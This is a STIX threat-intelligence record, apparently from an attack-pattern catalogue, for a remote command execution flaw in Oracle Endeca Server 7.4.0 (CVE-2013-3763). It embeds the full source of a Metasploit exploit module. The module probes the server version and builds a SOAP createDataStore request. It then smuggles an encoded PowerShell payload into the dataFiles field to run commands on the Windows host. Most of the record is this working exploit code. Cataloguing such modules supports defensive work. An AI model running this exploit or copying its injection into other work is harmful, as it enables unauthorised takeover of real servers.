{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--11608a5d-1369-4358-a0b0-b4698e67f5ac",
    "created": "2024-08-14T16:51:51.137695Z",
    "modified": "2024-08-14T16:51:51.137699Z",
    "name": "Oracle Endeca Server Remote Command Execution",
    "description": " This module exploits a command injection vulnerability on the Oracle Endeca Server 7.4.0. The vulnerability exists on the createDataStore method from the controlSoapBinding web service. The vulnerable method only exists on the 7.4.0 branch and isn't available on the 7.5.5.1 branch. In addition, the injection has been found to be Windows specific. This module has been tested successfully on Endeca Server 7.4.0.787 over Windows 2008 R2 (64 bits). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/oracle_endeca_exec.rb",
            "external_id": "oracle_endeca_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3763"
        },
        {
            "source_name": "reference",
            "url": "http://www.oracle.com/technetwork/topics/security/cpujuly2013-1899826.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Powershell\n\n  def initialize\n    super(\n      'Name'        \t=> 'Oracle Endeca Server Remote Command Execution',\n      'Description'   => %q{\n        This module exploits a command injection vulnerability on the Oracle Endeca\n        Server 7.4.0. The vulnerability exists on the createDataStore method from the\n        controlSoapBinding web service. The vulnerable method only exists on the 7.4.0\n        branch and isn't available on the 7.5.5.1 branch. In addition, the injection\n        has been found to be Windows specific. This module has been tested successfully\n        on Endeca Server 7.4.0.787 over Windows 2008 R2 (64 bits).\n      },\n      'Author'      => [\n        'rgod <rgod[at]autistici.org>', # Vulnerability discovery\n        'juan vazquez' # Metasploit module\n      ],\n      'Platform'    => 'win',\n      'Arch'        => [ ARCH_X64, ARCH_X86 ],\n      'References'  =>\n        [\n          [ 'CVE', '2013-3763' ],\n          [ 'BID', '61217' ],\n          [ 'OSVDB', '95269' ],\n          [ 'ZDI', '13-190' ],\n          [ 'URL', 'http://www.oracle.com/technetwork/topics/security/cpujuly2013-1899826.html' ]\n        ],\n      'Targets'     =>\n        [\n          [ 'Oracle Endeca Server 7.4.0 / Microsoft Windows 2008 R2 64 bits', { } ]\n        ],\n      'DefaultTarget'  => 0,\n      'Privileged'     => false,\n      'DisclosureDate' => 'Jul 16 2013'\n    )\n\n    register_options(\n      [\n        Opt::RPORT(7770),\n        OptString.new('TARGETURI', [true, 'The URI path of the Control Web Service', '/ws/control'])\n      ])\n  end\n\n  def version_soap\n    soap = <<-eos\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns=\"http://www.endeca.com/endeca-server/control/1/0\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <ns:version/>\n   </soapenv:Body>\n</soapenv:Envelope>\n    eos\n\n    return soap\n  end\n\n  def create_data_store_soap(name, files)\n    soap = <<-eos\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns=\"http://www.endeca.com/endeca-server/control/1/0\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <ns:createDataStore>\n         <ns:dataStoreConfig>\n            <ns:name>#{name}</ns:name>\n            <ns:dataFiles>#{files}</ns:dataFiles>\n         </ns:dataStoreConfig>\n      </ns:createDataStore>\n   </soapenv:Body>\n</soapenv:Envelope>\n    eos\n\n    return soap\n  end\n\n  def check\n\n    res = send_request_soap(version_soap)\n\n    if res.nil? or res.code != 200 or res.body !~ /versionResponse/\n      return Exploit::CheckCode::Safe\n    end\n\n    version_match = res.body.match(/<serverVersion>Oracle Endeca Server ([0-9\\.]*) /)\n\n    if version_match.nil?\n      return Exploit::CheckCode::Safe\n    else\n      version = version_match[1]\n    end\n\n    vprint_status(\"Version found: Oracle Endeca Server #{version}\")\n\n    if version =~ /7\\.4\\.0/ and version <= \"7.4.0.787\"\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n\n  end\n\n  def send_request_soap(data)\n    res = send_request_cgi({\n      'uri'     => normalize_uri(target_uri.path),\n      'method'  => 'POST',\n      'ctype'   => 'text/xml; charset=utf-8',\n      'headers' =>\n        {\n          'SOAPAction'     => \"\\\"\\\"\"\n        },\n      'data'    => data\n    })\n\n    return res\n  end\n\n  def exploit\n    command = cmd_psh_payload(payload.encoded, payload_instance.arch.first)\n    if command.length > 8000\n      # Windows 2008 Command Prompt Max Length is 8191\n      fail_with(Failure::BadConfig, \"#{peer} - The selected payload is too long to execute through powershell in one command\")\n    end\n    print_status(\"Exploiting through Powershell...\")\n    execute_command(command)\n  end\n\n  def execute_command(cmd)\n    # HTML encode ampersands so SOAP is correctly interpreted\n    cmd.gsub!(/&/, \"&#x26;\")\n    injection = \"c:\\\\&#x22;&#x26; #{cmd} &#x26;&#x22;\"\n    exploit_data = create_data_store_soap(rand_text_alpha(4), injection)\n    begin\n      res = send_request_soap(exploit_data)\n      if res.nil? or res.code != 500 or ( res.body !~ /Error creating data files at/ and res.body !~ /Data files don't exist/ )\n        print_status(\"#{res.code}\\n#{res.body}\") if res\n        fail_with(Failure::UnexpectedReply, \"#{peer} - Unable to execute the CMD Stager\")\n      end\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Unable to connect\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "Jul 16 2013",
    "x_mitre_platforms": [
        "win'"
    ]
}